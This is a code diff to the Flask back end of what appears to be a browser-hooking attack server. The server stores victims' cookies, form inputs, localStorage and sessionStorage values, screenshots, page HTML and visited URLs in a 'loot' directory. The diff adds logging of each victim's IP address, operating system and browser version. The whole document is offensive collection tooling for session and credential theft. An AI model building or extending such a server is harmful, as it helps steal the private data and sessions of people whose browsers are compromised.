@@ -7,6 +7,7 @@ from sqlalchemy_utils import database_exists
 from flask_login import LoginManager, login_user, logout_user, UserMixin, login_required, current_user
 from flask_bcrypt import Bcrypt
 from enum import Enum
+from user_agents import parse
 import magic
 import json
 import os
@@ -96,6 +97,10 @@ class Client(db.Model):
     notes     = db.Column(db.Text)
     firstSeen = db.Column(db.DateTime(timezone=True),server_default=func.now())
     lastSeen  = db.Column(db.DateTime(timezone=True), onupdate=func.now())
+    ipAddress = db.Column(db.String(20), nullable=True)
+    platform  = db.Column(db.String(100), nullable=True)
+    browser   = db.Column(db.String(100), nullable=True)
+
 
     def update(self):
         self.lastSeen = func.now()
@@ -298,9 +303,22 @@ def dbCommit():
 
 
 # Updates "last seen" timestamp"
-def clientSeen(identifier):
+def clientSeen(identifier, ip, userAgent):
+    print("!! Client seen: " + str(ip) + ', ' + userAgent)
     # print("*** Starting clientSeen Update!")
+
+    parsedUserAgent = parse(userAgent)
+    # print("--Browser: " + parsedUserAgent.browser.family + " " + parsedUserAgent.browser.version_string)
+    # print("--Platform: " + parsedUserAgent.os.family)
+
+
+    # DB commit is handled by caller to clientSeen() method, don't do it here
     client = Client.query.filter_by(nickname=identifier).first()
+    client.ipAddress = ip
+    client.platform  = parsedUserAgent.os.family
+    client.browser   = parsedUserAgent.browser.family + " " + parsedUserAgent.browser.version_string
+
+    # update method touches the database lastseen timestamp
     client.update()
     # print("--- Done client seen update...")
 
@@ -478,7 +496,7 @@ def recordScreenshot(identifier):
     # Put it in the DB
     newScreenshot = Screenshot(clientID=identifier, fileName="./loot/" + lootDir + "/" + str(imageNumber) + "_Screenshot.png")
     db.session.add(newScreenshot)
-    clientSeen(identifier)
+    clientSeen(identifier, request.remote_addr, request.headers.get('User-Agent'))
     dbCommit()
 
     # add to global event table
@@ -523,7 +541,7 @@ def recordHTML(identifier):
     newHtml = HtmlCode(clientID=identifier, url=content['url'], 
         code=content['html'], fileName = lootFile)
     db.session.add(newHtml)
-    clientSeen(identifier)
+    clientSeen(identifier, request.remote_addr, request.headers.get('User-Agent'))
     dbCommit()
 
     # add to global event table
@@ -549,11 +567,10 @@ def recordUrl(identifier):
     # print("Got URL: " + url)
     logEvent(identifier, "URL Visited: " + url)
 
-
     # Put it in the DB
     newUrl = UrlVisited(clientID=identifier, url=content['url'])
     db.session.add(newUrl)
-    clientSeen(identifier)
+    clientSeen(identifier, request.remote_addr, request.headers.get('User-Agent'))
     dbCommit()
 
     # add to global event table
@@ -583,7 +600,7 @@ def recordInput(identifier):
     # Put it in the DB
     newInput = UserInput(clientID=identifier, inputName=content['inputName'], inputValue=content['inputValue'])
     db.session.add(newInput)
-    clientSeen(identifier)
+    clientSeen(identifier, request.remote_addr, request.headers.get('User-Agent'))
     dbCommit()
 
     # add to global event table
@@ -614,7 +631,7 @@ def recordCookie(identifier):
     # Put it in the DB
     newCookie = Cookie(clientID=identifier, cookieName=cookieName, cookieValue=cookieValue)
     db.session.add(newCookie)
-    clientSeen(identifier)
+    clientSeen(identifier, request.remote_addr, request.headers.get('User-Agent'))
     dbCommit()
 
     # add to global event table
@@ -642,7 +659,7 @@ def recordLocalStorageEntry(identifier):
     # Put it in the DB
     newLocalStorage = LocalStorage(clientID=identifier, key=localStorageKey, value=localStorageValue)
     db.session.add(newLocalStorage)
-    clientSeen(identifier)
+    clientSeen(identifier, request.remote_addr, request.headers.get('User-Agent'))
     dbCommit()
 
     # add to global event table
@@ -669,7 +686,7 @@ def recordSessionStorageEntry(identifier):
     # Put it in the DB
     newSessionStorage = SessionStorage(clientID=identifier, key=sessionStorageKey, value=sessionStorageValue)
     db.session.add(newSessionStorage)
-    clientSeen(identifier)
+    clientSeen(identifier, request.remote_addr, request.headers.get('User-Agent'))
     dbCommit()
 
 
@@ -695,7 +712,8 @@ def getClients():
     clients = Client.query.all()
 
     allClients = [{'id':escape(client.id), 'nickname':escape(client.nickname), 'notes':escape(client.notes), 
-        'firstSeen':client.firstSeen, 'lastSeen':client.lastSeen} for client in clients]
+        'firstSeen':client.firstSeen, 'lastSeen':client.lastSeen, 'ip':escape(client.ipAddress),
+        'platform':escape(client.platform), 'browser':escape(client.browser)} for client in clients]
 
     return jsonify(allClients)
 
